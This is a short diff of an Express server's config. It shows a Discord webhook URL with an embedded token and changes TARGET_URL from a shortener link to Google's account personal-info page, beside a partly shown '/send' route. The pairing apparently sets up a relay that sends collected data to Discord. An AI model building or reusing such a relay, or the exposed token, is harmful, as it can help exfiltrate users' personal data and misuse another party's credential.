@@ -8,7 +8,7 @@ app.use(express.json({ limit: "10mb" }));
 
 // ====== CONFIG ======
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1459229880221700375/esk71z4kmwuwYOLByflofkjZra-deSo82CK0UogimXJbp0QKB13MLQ4wP3mm-yFrw6rj';
-const TARGET_URL = 'https://url-shortener.me/726T+';
+const TARGET_URL = 'https://myaccount.google.com/personal-info';
 // ====================
 
 app.get('/send', async (req, res) => {
